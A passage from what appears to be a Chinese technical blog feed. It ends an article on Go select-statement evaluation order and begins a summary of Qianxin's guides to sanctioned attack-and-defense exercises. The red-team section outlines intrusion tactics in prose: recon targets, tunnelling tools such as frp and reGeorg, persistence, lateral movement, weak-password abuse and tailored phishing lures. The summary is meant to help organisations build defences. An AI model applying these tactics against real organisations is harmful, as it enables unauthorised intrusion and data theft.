<h2 id="样例二：大同小异"><a href="#样例二：大同小异" class="headerlink" title="样例二：大同小异"></a>样例二：大同小异</h2><p>本样例介绍一个在发送操作与接收操作中常见的理解误区，同样有三个函数与三个 case：</p>
<ul>
<li>case 1：发送操作与接收操作结合，将 <code>&lt;-getIntChan()</code> 的求值结果，发送至 <code>getIntBufChan()</code> 返回的有缓冲通道中。</li>
<li>case 2：接收操作，从 <code>getIntBufChan()</code> 返回的有缓冲通道中，接收 int 类型数值并赋值给 <code>intArr</code> 的第二个元素 <code>intArr[1]</code>。</li>
<li>default case：默认操作，只打印日志。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	intChan    = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">	intBufChan = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line">	intArr     = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		intBufChan &lt;- <span class="number">1</span></span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">select</span> &#123;</span><br><span class="line">	<span class="keyword">case</span> getIntBufChan() &lt;- &lt;-getIntChan():</span><br><span class="line">		fmt.Printf(<span class="string">&quot;select case 1\n&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> intArr[<span class="number">1</span>] = &lt;-getIntBufChan():</span><br><span class="line">		fmt.Printf(<span class="string">&quot;select case 2\n&quot;</span>)</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		fmt.Printf(<span class="string">&quot;select default case\n&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getIntChan</span><span class="params">()</span></span> <span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;get int chan\n&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> intChan</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getIntBufChan</span><span class="params">()</span></span> <span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;get int buf chan\n&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> intBufChan</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>样例运行后，大家通常可能会认为 select 语句会选择 case 2，其实不然，在按顺序执行了 <code>getIntBufChan()</code>、<code>getIntChan()</code> 后，直接就报死锁错误了：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">get <span class="type">int</span> buf <span class="keyword">chan</span></span><br><span class="line">get <span class="type">int</span> <span class="keyword">chan</span></span><br><span class="line">fatal <span class="type">error</span>: all goroutines are asleep - deadlock!</span><br><span class="line"></span><br><span class="line">goroutine <span class="number">1</span> [<span class="keyword">chan</span> receive]:</span><br><span class="line">main.main()</span><br><span class="line">	C:/Go/src/<span class="keyword">select</span>-test/main.<span class="keyword">go</span>:<span class="number">17</span> +<span class="number">0x9d</span></span><br></pre></td></tr></table></figure>

<p>以上结果的原因，在于对发送操作的右值表达式求值运算理解不到位：<strong>select 语句需要获取 <code>&lt;-getIntChan()</code> 表达式的求值结果，而不仅仅是 <code>getIntChan()</code> 的。</strong>因此，在没有任何 goroutine 往 <code>intChan</code> 通道发送数据的情况下，想要从中接收数据必定是阻塞的，继而引发程序死锁。</p>
<p>在样例二的基础上，添加一个 goroutine 往 <code>intChan</code> 通道发送数据，即可解决问题：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	intChan    = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">	intBufChan = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line">	intArr     = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		intChan &lt;- <span class="number">0</span></span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		intBufChan &lt;- <span class="number">0</span></span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">select</span> &#123;</span><br><span class="line">	<span class="keyword">case</span> getIntBufChan() &lt;- &lt;-getIntChan():</span><br><span class="line">		fmt.Printf(<span class="string">&quot;select case 1\n&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> intArr[<span class="number">1</span>] = &lt;-getIntBufChan():</span><br><span class="line">		fmt.Printf(<span class="string">&quot;select case 2\n&quot;</span>)</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		fmt.Printf(<span class="string">&quot;select default case\n&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getIntChan</span><span class="params">()</span></span> <span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;get int chan\n&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> intChan</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getIntBufChan</span><span class="params">()</span></span> <span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;get int buf chan\n&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> intBufChan</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多次运行后，同样发现只有以下两种结果，并且 default case 永远不会进入。</p>
<p>第一种结果选择 case 1，执行顺序为：<code>getIntBufChan()</code> → <code>getIntChan()</code> → <code>getIntBufChan()</code> → <code>fmt.Printf(&quot;select case 1\n&quot;)</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">get <span class="type">int</span> buf <span class="keyword">chan</span></span><br><span class="line">get <span class="type">int</span> <span class="keyword">chan</span></span><br><span class="line">get <span class="type">int</span> buf <span class="keyword">chan</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>第二种结果选择 case 2，执行顺序为：<code>getIntBufChan()</code> → <code>getIntChan()</code> → <code>getIntBufChan()</code> → <code>intArr[1]</code> → <code>fmt.Printf(&quot;select case 2\n&quot;)</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">get <span class="type">int</span> buf <span class="keyword">chan</span></span><br><span class="line">get <span class="type">int</span> <span class="keyword">chan</span></span><br><span class="line">get <span class="type">int</span> buf <span class="keyword">chan</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>综上结果，需特别注意 <code>&lt;-getIntChan()</code> 表达式在发送操作与接收操作中的区别：</p>
<ul>
<li>接收操作：只需对 <code>getIntChan()</code> 求值，只要其返回结果是接收通道即可。</li>
<li>发送操作：需要对 <code>&lt;-getIntChan()</code> 整体求值，其返回结果必须是发送通道相应的数据类型。</li>
</ul>
<h2 id="样例三：时空交错"><a href="#样例三：时空交错" class="headerlink" title="样例三：时空交错"></a>样例三：时空交错</h2><p>接下来，再讨论一个与时间相关的执行顺序问题，以下样例只含有两个函数与两个 case：</p>
<ul>
<li>case 1：发送操作，将 <code>getInt(2)</code> 的求值结果，发送至 <code>getIntBufChan()</code> 返回的有缓冲通道中，注意此处 <code>getInt(2)</code> 需等待两秒后再返回。</li>
<li>case 2：接收操作，从 <code>time.After(time.Second)</code> 返回的无缓冲通道中，等到一秒后，接收 time.Time 类型的数据，但不进行赋值。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> intBufChan = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">select</span> &#123;</span><br><span class="line">	<span class="keyword">case</span> getIntBufChan() &lt;- getInt(<span class="number">2</span>):</span><br><span class="line">		log.Printf(<span class="string">&quot;select case 1\n&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> &lt;-time.After(time.Second):</span><br><span class="line">		log.Printf(<span class="string">&quot;select case 2\n&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInt</span><span class="params">(i <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	log.Printf(<span class="string">&quot;get int sleep 2s...\n&quot;</span>)</span><br><span class="line">	time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">	log.Printf(<span class="string">&quot;get int %d\n&quot;</span>, i)</span><br><span class="line">	<span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getIntBufChan</span><span class="params">()</span></span> <span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">	log.Printf(<span class="string">&quot;get int buf chan\n&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> intBufChan</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>样例运行后，可能直观地会认为选择 case 2，因为 case 2 只需等待一秒，而 case 1 需要等待两秒。但事实却恰恰相反，样例中的 select 语句只会选择 case 1：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">22</span>:<span class="number">04</span> get <span class="type">int</span> buf <span class="keyword">chan</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">22</span>:<span class="number">04</span> get <span class="type">int</span> sleep <span class="number">2</span>s...</span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">22</span>:<span class="number">06</span> get <span class="type">int</span> <span class="number">2</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">22</span>:<span class="number">06</span> <span class="keyword">select</span> <span class="keyword">case</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>对于以上与直觉相悖的结果，仍然在于对表达式求值运算的理解有偏差：<strong>select 语句必须按顺序依次完成表达式的求值运算，若某个表达式未完成，则会一直阻塞在执行流程的第 1 步，导致后续的通信操作无法进行。</strong>因此，即使 case 2 等待时间比 case 1 短，但也需等 case 1 等待两秒并执行完毕后，才能开始一秒的倒计时，此时显然只能选择 case 1 的发送操作了。</p>
<p>在样例三的基础上，调换两个 case 中的表达式再运行，会发现两个 case 均有被选择的可能：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> intBufChan = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">select</span> &#123;</span><br><span class="line">	<span class="keyword">case</span> &lt;-time.After(time.Second):</span><br><span class="line">		log.Printf(<span class="string">&quot;select case 1\n&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> getIntBufChan() &lt;- getInt(<span class="number">2</span>):</span><br><span class="line">		log.Printf(<span class="string">&quot;select case 2\n&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInt</span><span class="params">(i <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	log.Printf(<span class="string">&quot;get int sleep 2s...\n&quot;</span>)</span><br><span class="line">	time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">	log.Printf(<span class="string">&quot;get int %d\n&quot;</span>, i)</span><br><span class="line">	<span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getIntBufChan</span><span class="params">()</span></span> <span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">	log.Printf(<span class="string">&quot;get int buf chan\n&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> intBufChan</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一种结果选择 case 1，执行顺序为：<code>time.After(time.Second)</code> → <code>getIntBufChan()</code> → <code>getInt(2)</code> → <code>time.Sleep(2 * time.Second)</code> → <code>fmt.Printf(&quot;select case 1\n&quot;)</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">53</span>:<span class="number">29</span> get <span class="type">int</span> buf <span class="keyword">chan</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">53</span>:<span class="number">29</span> get <span class="type">int</span> sleep <span class="number">2</span>s...</span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">53</span>:<span class="number">31</span> get <span class="type">int</span> <span class="number">2</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">53</span>:<span class="number">31</span> <span class="keyword">select</span> <span class="keyword">case</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>第二种结果选择 case 2，执行顺序为：<code>time.After(time.Second)</code> → <code>getIntBufChan()</code> → <code>getInt(2)</code> → <code>time.Sleep(2 * time.Second)</code> → <code>fmt.Printf(&quot;select case 2\n&quot;)</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">54</span>:<span class="number">15</span> get <span class="type">int</span> buf <span class="keyword">chan</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">54</span>:<span class="number">15</span> get <span class="type">int</span> sleep <span class="number">2</span>s...</span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">54</span>:<span class="number">17</span> get <span class="type">int</span> <span class="number">2</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">12</span> <span class="number">11</span>:<span class="number">54</span>:<span class="number">17</span> <span class="keyword">select</span> <span class="keyword">case</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>即便如此，应该能意识到，样例三中 <code>&lt;-time.After(time.Second)</code> 表达式的用法是毫无意义的：要么被 <code>getInt(2)</code> 阻塞后才开始倒计时，要么倒计时结束后与 <code>getIntBufChan() &lt;- getInt(2)</code>  一起被随机选择，无法起到超时控制的作用。</p>
<p>综上结果，需注意 case 中与时间相关的表达式求值运算，表达式中的时间等待，会阻塞 select 语句的整体执行流程。尤其是在使用 <code>time.After(d Duration)</code> 等超时控制函数时，应当留意其他 case 中的函数是否存在时间等待逻辑，避免事与愿违。</p>
<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>至此，相信大家对 select 语句的整体执行流程有了更全面的理解，也欢迎大家提出不同见解，相互交流学习。</p>
<p>最后附上一张 select 语句完整的执行流程图：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/simply-analyse-the-execution-order-of-select-statement-in-golang/steps-in-select-statement.png" alt="steps-in-select-statement"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://go.dev/ref/spec#Select_statements">The Go Programming Language Specification - Select statements</a></p>
<p>[2] <a href="https://www.runoob.com/go/go-select-statement.html">Go 语言 select 语句</a></p>
<p>[3] <a href="https://juejin.cn/post/7085618326516269064">Go语言36讲笔记–11通道的高级使用方式</a></p>
<p>[4] <a href="https://blog.csdn.net/qmhball/article/details/120290804">go语言select语句中的求值问题</a></p>
]]></content>
      <categories>
        <category>Programming</category>
        <category>Go</category>
      </categories>
      <tags>
        <tag>Go</tag>
        <tag>Syntax</tag>
      </tags>
  </entry>
  <entry>
    <title>奇安信「实战攻防三部曲」要点总结</title>
    <url>/2019/09/22/summary-of-practical-tripple-guide-of-attack-and-defense-by-qianxin/</url>
    <content><![CDATA[<style>
table th:nth-of-type(1) {
    width: 16%;
}
</style>

<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>2016 年以来，为贯彻落实国家网络空间安全战略，国家监管机构大力推动网络实战攻防演习。全国性的网络实战攻防演习，从 2016 年仅有的几家参演单位，到 2019 年的上百家参演单位，演习范围越来越广，演习周期越来越长，演习规模越来越大。</p>
<p>网络实战攻防演习，是指<strong>以实际运行的信息系统为保护目标，通过有监督的攻防对抗，最大限度地模拟真实的网络攻击，以此来检验信息系统的实际安全性和运维保障的实际有效性</strong>。</p>
<span id="more"></span>

<p>近年来，网络实战攻防演习的发展程度与技术手段总结如下：</p>
<table>
<thead>
<tr>
<th>年份</th>
<th>发展程度</th>
<th>技术手段</th>
</tr>
</thead>
<tbody><tr>
<td>2016</td>
<td>起步阶段</td>
<td>攻防重点大多集中于<strong>互联网入口或内网边界</strong></td>
</tr>
<tr>
<td>2017</td>
<td>开始与重大活动的网络安全保障工作紧密结合</td>
<td>从互联网侧发起直接攻击，突破内网边界后发起<strong>横向移动、跨域攻击</strong></td>
</tr>
<tr>
<td>2018</td>
<td>开始向行业和地方深入</td>
<td>防方<strong>对攻击行为的监测、发现和溯源能力</strong>大幅增强，攻方开始转向<strong>精准攻击、供应链攻击</strong>等新型作战策略</td>
</tr>
<tr>
<td>2019</td>
<td>受到了监管部门、政企机构和安全企业的空前重视</td>
<td>防方广泛采用<strong>流量分析、EDR、蜜罐、白名单</strong>等专业监测与防护技术，攻方开始采用 <strong>0day 漏洞攻击、1day 漏洞攻击、身份仿冒、钓鱼 WiFi、鱼叉邮件、水坑攻击</strong>等高级攻击手法</td>
</tr>
</tbody></table>
<p>为帮助大型政企机构运营者更好地参与网络实战攻防演习，提升自身的安全能力，奇安信集团安服团队结合 200 余次实战攻防演习经验，分别从<strong>红队视角、蓝队视角和紫队视角</strong>，来解读网络实战攻防演习的要领，以及如何结合演习提升政企机构的安全能力。</p>
<blockquote>
<p>小贴士：实战攻防演习中的红蓝对抗，是沿用了军事演习的概念和方法，不过「红队」和「蓝队」尚无严格定义。一般来说，依据绝大多数网络安全工作者的习惯，<strong>将攻击方命名为红队，将防守方命名为蓝队，将演练组织机构命名为紫队</strong>。</p>
</blockquote>
<ul>
<li>实战攻防之红队视角下的防御体系突破：<a href="https://www.qianxin.com/threat/reportdetail/32">https://www.qianxin.com/threat/reportdetail/32</a></li>
<li>实战攻防之蓝队视角下的防御体系构建：<a href="https://www.qianxin.com/threat/reportdetail/33">https://www.qianxin.com/threat/reportdetail/33</a></li>
<li>实战攻防之紫队视角下的实战攻防演习组织：<a href="https://www.qianxin.com/threat/reportdetail/34">https://www.qianxin.com/threat/reportdetail/34</a></li>
</ul>
<h1 id="0x01-红队视角下的防御体系突破"><a href="#0x01-红队视角下的防御体系突破" class="headerlink" title="0x01 红队视角下的防御体系突破"></a>0x01 红队视角下的防御体系突破</h1><p>本章总结归纳了红队常用的攻击策略和攻击战术，有助于政企机构理解攻方思维，提升演习水平，构筑更有效的安全防御体系。</p>
<h2 id="1-1-什么是红队"><a href="#1-1-什么是红队" class="headerlink" title="1.1 什么是红队"></a>1.1 什么是红队</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul>
<li>释义：红队通常指网络实战攻防演习中的<strong>攻击方</strong>。</li>
<li>职责：红队一般会针对目标系统、人员、软件、硬件和设备同时执行的<strong>多角度、混合、对抗性的模拟攻击</strong>；以实现系统提权、控制业务、获取数据为目标，来<strong>发现系统、技术、人员和基础架构中存在的网络安全隐患或薄弱环节</strong>。</li>
</ul>
<h3 id="与黑客的区别"><a href="#与黑客的区别" class="headerlink" title="与黑客的区别"></a>与黑客的区别</h3><table>
<thead>
<tr>
<th>对比点</th>
<th>黑客</th>
<th>红队</th>
</tr>
</thead>
<tbody><tr>
<td>目标</td>
<td>攻破系统，<strong>获取利益</strong></td>
<td>发现系统薄弱环节，<strong>提升系统安全性</strong></td>
</tr>
<tr>
<td>思路</td>
<td>通常只要<strong>发现某一种攻击方法</strong>能有效地达成目标，就没有必要再去尝试其他的攻击方法和途径</td>
<td>要尽可能地找出系统中存在的<strong>所有安全问题</strong>，往往会穷尽所有已知的攻击方法</td>
</tr>
</tbody></table>
<h3 id="与渗透测试的区别"><a href="#与渗透测试的区别" class="headerlink" title="与渗透测试的区别"></a>与渗透测试的区别</h3><table>
<thead>
<tr>
<th>对比点</th>
<th>渗透测试</th>
<th>红队攻击</th>
</tr>
</thead>
<tbody><tr>
<td>方法</td>
<td>按照<strong>规范技术流程</strong>对目标系统进行的安全性测试</td>
<td>一般只限定攻击范围和攻击时段，对具体的攻击方法则<strong>没有太多限制</strong></td>
</tr>
<tr>
<td>要求</td>
<td>一般只要<strong>验证漏洞的存在</strong>即可</td>
<td>实际<strong>获取系统权限或系统数据</strong></td>
</tr>
<tr>
<td>限制</td>
<td>明确要求<strong>禁止使用社工手段</strong></td>
<td>允许<strong>在一定范围内使用社工手段</strong></td>
</tr>
</tbody></table>
<h3 id="人员分配"><a href="#人员分配" class="headerlink" title="人员分配"></a>人员分配</h3><ul>
<li>通常以 3 人作为一个战斗小组，其中 1 人为队长。</li>
<li>组长通常综合能力最强，并具备较强的组织意识、应变能力和丰富的实战经验。</li>
<li>组员往往各有所长，具备边界突破、横向移动、情报收集或武器制作等某一方面或几个方面的专长。</li>
</ul>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
<li>实战攻防演习过程中，通常不会严格限定红队的攻击手法，但所有技术的使用、目标的达成，<strong>必须严格遵守国家相关的法律和法规</strong>。</li>
<li>红队队员的<strong>能力要求是综合全面的</strong>，不仅要会熟练使用各种黑客工具、分析工具，还要熟知目标系统及其安全配置，并具备一定的代码开发能力，以便应对特殊问题。</li>
</ul>
<h2 id="1-2-红队攻击三板斧"><a href="#1-2-红队攻击三板斧" class="headerlink" title="1.2 红队攻击三板斧"></a>1.2 红队攻击三板斧</h2><h3 id="第一阶段：情报收集"><a href="#第一阶段：情报收集" class="headerlink" title="第一阶段：情报收集"></a>第一阶段：情报收集</h3><p>外部情报侦察和信息收集主要包括：<strong>组织架构、IT 资产、敏感信息泄露、供应商信息</strong>等。</p>
<table>
<thead>
<tr>
<th>类别</th>
<th>内容</th>
<th>目的</th>
</tr>
</thead>
<tbody><tr>
<td>组织架构</td>
<td>单位部门划分、人员信息、工作职能、下属单位等</td>
<td>定位关键人物以实施鱼叉攻击、确定内网横纵向渗透路径</td>
</tr>
<tr>
<td>IT 资产</td>
<td>域名、IP 地址、C 段、开放端口、运行服务、Web 中间件、Web 应用、移动应用、网络架构等</td>
<td>为漏洞发现和利用提供数据支撑</td>
</tr>
<tr>
<td>敏感信息泄露</td>
<td>代码泄露、文档信息泄露、邮箱信息泄露、历史漏洞泄露信息等</td>
<td>代码审计、社工钓鱼、获取账户密码、发现未修复漏洞</td>
</tr>
<tr>
<td>供应商信息</td>
<td>相关合同、系统、软件、硬件、代码、服务、人员等</td>
<td>针对性地开展供应链攻击</td>
</tr>
</tbody></table>
<h3 id="第二阶段：建立据点"><a href="#第二阶段：建立据点" class="headerlink" title="第二阶段：建立据点"></a>第二阶段：建立据点</h3><p>Step 1：尝试绕过 WAF、IPS、AV 等防护设备或软件，用最少的流量、最小的动作去<strong>撕开口子</strong>；</p>
<p>Step 2：通过撕开的口子<strong>纵向渗透</strong>，直到找到内网入口为止；</p>
<p>Step 3：通过 frp、ewsocks、reGeorg 等工具，在内网入口<strong>建立隧道</strong>，形成从外网到内网的跳板，作为内网渗透据点。</p>
<p>建立据点常见问题及操作：</p>
<ul>
<li>权限不足：利用系统、程序或服务漏洞进行<strong>提权操作</strong>，以获得更高权限。</li>
<li>跳板不稳定：进行<strong>持久化操作</strong>，保证PC机重启后，据点依然可以在线。</li>
</ul>
<blockquote>
<p>小贴士：</p>
<p>（1）“打点”（又称“撕口子”）：针对某薄弱环节，尝试通过漏洞利用或社工钓鱼等手段去获取外网系统控制权限。</p>
<p>（2）纵向渗透：通过撕开的口子，寻找与内网连接的通道（如 DMZ 区），进一步由外到内深入渗透。</p>
<p>（3）DMZ 区（Demilitarized Zone，隔离区）：设立在企业内部网络与外部网络之间的缓冲区域内，此区域用于放置一些公开服务（如企业 Web 服务器、FTP 服务器等），既能被内部网络与外部网络同时访问，还能避免内部网络被外部网络访问。</p>
</blockquote>
<h3 id="第三阶段：横向移动"><a href="#第三阶段：横向移动" class="headerlink" title="第三阶段：横向移动"></a>第三阶段：横向移动</h3><p>Step 1：先在本机及内网进行深入的<strong>信息收集和情报刺探</strong>；</p>
<ul>
<li><p>内网信息收集：收集当前计算机的网络连接、进程列表、命令执行历史记录、数据库信息、当前用户信息、管理员登录信息、总结密码规律、补丁更新频率等信息；</p>
</li>
<li><p>内网情报刺探：刺探内网其他计算机或服务器的 IP、主机名、开放端口、开放服务、开放应用等情报。</p>
</li>
</ul>
<p>Step 2：再利用内网计算机或服务器中的不及时修复漏洞、不做安全防护、使用相同口令等弱点来进行<strong>横向渗透扩大战果</strong>；</p>
<p>Step 3：内网漫游过程中，需要重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等，尝试<strong>突破核心系统权限、控制核心业务、获取核心数据</strong>，最终完成目标突破工作。</p>
<h2 id="1-3-常用攻击战术"><a href="#1-3-常用攻击战术" class="headerlink" title="1.3 常用攻击战术"></a>1.3 常用攻击战术</h2><h3 id="利用弱口令获得权限"><a href="#利用弱口令获得权限" class="headerlink" title="利用弱口令获得权限"></a>利用弱口令获得权限</h3><ul>
<li>实际工作中，通过弱口令获得权限的情况占据 90% 以上。</li>
<li>针对未启用 SSO 验证的不同内网业务系统，许多员工习惯使用同一套账户密码。</li>
<li>很多通用系统在安装后会设置默认管理密码，有些管理员从未更改过密码。</li>
<li>为了管理方便，有些管理员使用同一套密码管理不同服务器。</li>
</ul>
<h3 id="利用社工进入内网"><a href="#利用社工进入内网" class="headerlink" title="利用社工进入内网"></a>利用社工进入内网</h3><ul>
<li>很多员工对接收的木马、钓鱼邮件没有防范意识，会轻易点击了夹带在钓鱼邮件中的恶意附件。</li>
<li>针对企业中不太懂安全的员工，发送特制的钓鱼邮件，如给法务人员发律师函、给人力资源人员发简历、给销售人员发采购需求等。</li>
<li>为了使用方便，有些员工将系统地址与账户密码以明文形式存储在文档中，或习惯性地使用浏览器的记住密码功能。</li>
</ul>
<h3 id="利用旁路攻击实施渗透"><a href="#利用旁路攻击实施渗透" class="headerlink" title="利用旁路攻击实施渗透"></a>利用旁路攻击实施渗透</h3><ul>
<li>绝大部分企业的下属子公司之间，以及下属公司与集团总部之间的内部网络均未进行有效隔离，导致下属公司一旦被突破，即可通过内网横向渗透直接攻击到集团总部，漫游企业整个内网，攻击任意系统。</li>
<li>大部分企业对开放于互联网的边界设备较为信任（如 VPN 系统、虚拟化桌面系统、邮件服务系统等），并未在其传输通道上增加更多的防护手段。</li>
</ul>
<h3 id="秘密渗透与多点潜伏"><a href="#秘密渗透与多点潜伏" class="headerlink" title="秘密渗透与多点潜伏"></a>秘密渗透与多点潜伏</h3><ul>
<li>一般不会大规模使用漏洞扫描器 ，而是针对性地根据特定系统、特定平台、特定应用、特定版本，去寻找与之对应的漏洞，编写可以绕过防护设备的 EXP 来实施攻击操作。</li>
<li>由于很多安全设备防护能力薄弱，或安全人员技术能力欠缺，导致无法有效地识别攻击行为，也无法给出有效的攻击阻断、漏洞溯源及系统修复策略。</li>
